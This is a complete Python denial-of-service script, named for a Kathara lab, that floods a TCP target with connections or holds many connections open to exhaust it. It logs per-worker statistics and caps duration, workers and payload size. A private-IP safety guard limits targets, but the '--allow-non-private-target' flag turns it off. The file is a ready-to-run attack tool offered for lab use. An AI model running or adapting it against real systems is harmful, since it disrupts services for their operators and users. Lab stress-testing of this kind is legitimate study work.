#!/usr/bin/env python3
from __future__ import annotations

import argparse
import ipaddress
import json
import os
import random
import socket
import string
import threading
import time
from dataclasses import asdict, dataclass
from pathlib import Path
from typing import Dict, List, Optional

MAX_DURATION_SECONDS = 120
MAX_WORKERS = 100
MAX_PAYLOAD_SIZE = 4096
LAB_NETS = [
    ipaddress.ip_network("10.0.0.0/8"),
    ipaddress.ip_network("172.16.0.0/12"),
    ipaddress.ip_network("192.168.0.0/16"),
    ipaddress.ip_network("127.0.0.0/8"),
]

@dataclass
class WorkerStats:
    worker_id: int
    attempts: int = 0
    ok: int = 0
    failed: int = 0
    bytes_sent: int = 0
    min_rtt_ms: Optional[float] = None
    max_rtt_ms: Optional[float] = None
    total_rtt_ms: float = 0.0

    def ok_attempt(self, rtt_ms: float, sent: int) -> None:
        self.attempts += 1
        self.ok += 1
        self.bytes_sent += sent
        self.total_rtt_ms += rtt_ms
        self.min_rtt_ms = rtt_ms if self.min_rtt_ms is None else min(self.min_rtt_ms, rtt_ms)
        self.max_rtt_ms = rtt_ms if self.max_rtt_ms is None else max(self.max_rtt_ms, rtt_ms)

    def fail_attempt(self) -> None:
        self.attempts += 1
        self.failed += 1


def is_lab_target(host: str) -> bool:
    try:
        ip_obj = ipaddress.ip_address(socket.gethostbyname(host))
    except Exception:
        return False
    return any(ip_obj in net for net in LAB_NETS)


def payload(size: int, worker_id: int) -> bytes:
    head = f"LAB_DOS_TEST worker={worker_id} ts={time.time():.6f} ".encode()
    if size <= len(head):
        return head[:size]
    alphabet = string.ascii_letters + string.digits
    return head + "".join(random.choice(alphabet) for _ in range(size - len(head))).encode()


def connect_once(target: str, port: int, timeout: float, data: bytes) -> float:
    start = time.perf_counter()
    with socket.create_connection((target, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(data)
    return (time.perf_counter() - start) * 1000.0


def hold_open(target: str, port: int, timeout: float, data: bytes, stop_at: float, keepalive: float) -> bool:
    with socket.create_connection((target, port), timeout=timeout) as sock:
        sock.settimeout(timeout)
        sock.sendall(data)
        while time.time() < stop_at:
            time.sleep(max(keepalive, 0.2))
            try:
                sock.sendall(b".")
            except OSError:
                return False
    return True


def worker(worker_id: int, args: argparse.Namespace, stop_at: float, results: Dict[int, WorkerStats], lock: threading.Lock) -> None:
    stats = WorkerStats(worker_id=worker_id)
    data = payload(args.payload_size, worker_id)
    delay = args.delay_ms / 1000.0
    while time.time() < stop_at:
        try:
            if args.mode == "hold-open":
                start = time.perf_counter()
                if hold_open(args.target, args.port, args.timeout, data, stop_at, args.keepalive_interval):
                    stats.ok_attempt((time.perf_counter() - start) * 1000.0, len(data))
                else:
                    stats.fail_attempt()
            else:
                stats.ok_attempt(connect_once(args.target, args.port, args.timeout, data), len(data))
        except Exception:
            stats.fail_attempt()
        if delay > 0:
            time.sleep(delay)
    with lock:
        results[worker_id] = stats


def parse_args() -> argparse.Namespace:
    p = argparse.ArgumentParser(description="Controlled TCP stress generator for a private Kathara/lab target.")
    p.add_argument("--target", required=True)
    p.add_argument("--port", type=int, required=True)
    p.add_argument("--duration", type=int, default=30)
    p.add_argument("--workers", type=int, default=20)
    p.add_argument("--timeout", type=float, default=1.0)
    p.add_argument("--payload-size", type=int, default=64)
    p.add_argument("--delay-ms", type=int, default=20)
    p.add_argument("--mode", choices=["connect-flood", "hold-open"], default="connect-flood")
    p.add_argument("--keepalive-interval", type=float, default=2.0)
    p.add_argument("--log-file", default="/tmp/kathara_dos/dos_client_result.json")
    p.add_argument("--allow-non-private-target", action="store_true")
    return p.parse_args()


def validate(args: argparse.Namespace) -> None:
    if not 1 <= args.port <= 65535:
        raise SystemExit("Invalid port")
    if not 1 <= args.duration <= MAX_DURATION_SECONDS:
        raise SystemExit(f"duration must be 1..{MAX_DURATION_SECONDS}")
    if not 1 <= args.workers <= MAX_WORKERS:
        raise SystemExit(f"workers must be 1..{MAX_WORKERS}")
    if not 1 <= args.payload_size <= MAX_PAYLOAD_SIZE:
        raise SystemExit(f"payload-size must be 1..{MAX_PAYLOAD_SIZE}")
    if args.timeout <= 0 or args.timeout > 10:
        raise SystemExit("timeout must be >0 and <=10")
    if args.delay_ms < 0:
        raise SystemExit("delay-ms cannot be negative")
    if not args.allow_non_private_target and not is_lab_target(args.target):
        raise SystemExit("Safety guard: target must resolve to private/lab IP")


def main() -> int:
    args = parse_args()
    validate(args)
    Path(args.log_file).parent.mkdir(parents=True, exist_ok=True)
    started = time.time()
    stop_at = started + args.duration
    results: Dict[int, WorkerStats] = {}
    lock = threading.Lock()
    threads: List[threading.Thread] = []
    for i in range(args.workers):
        t = threading.Thread(target=worker, args=(i, args, stop_at, results, lock), daemon=True)
        t.start()
        threads.append(t)
    for t in threads:
        t.join()
    ended = time.time()
    workers = []
    for i in sorted(results):
        d = asdict(results[i])
        d["avg_rtt_ms"] = (d["total_rtt_ms"] / d["ok"]) if d["ok"] else None
        workers.append(d)
    total_attempts = sum(w["attempts"] for w in workers)
    total_ok = sum(w["ok"] for w in workers)
    total_failed = sum(w["failed"] for w in workers)
    avg_values = [w["avg_rtt_ms"] for w in workers if w["avg_rtt_ms"] is not None]
    summary = {
        "script": "dos_client.py",
        "pid": os.getpid(),
        "target": args.target,
        "port": args.port,
        "mode": args.mode,
        "workers_requested": args.workers,
        "duration_requested_s": args.duration,
        "started_at_epoch": started,
        "ended_at_epoch": ended,
        "elapsed_s": ended - started,
        "total_attempts": total_attempts,
        "total_ok": total_ok,
        "total_failed": total_failed,
        "success_rate": (total_ok / total_attempts) if total_attempts else 0.0,
        "bytes_sent": sum(w["bytes_sent"] for w in workers),
        "attempts_per_second": total_attempts / max(ended - started, 0.001),
        "avg_worker_rtt_ms": (sum(avg_values) / len(avg_values)) if avg_values else None,
        "workers": workers,
    }
    Path(args.log_file).write_text(json.dumps(summary, indent=2), encoding="utf-8")
    print(json.dumps(summary, indent=2))
    return 0

if __name__ == "__main__":
    raise SystemExit(main())
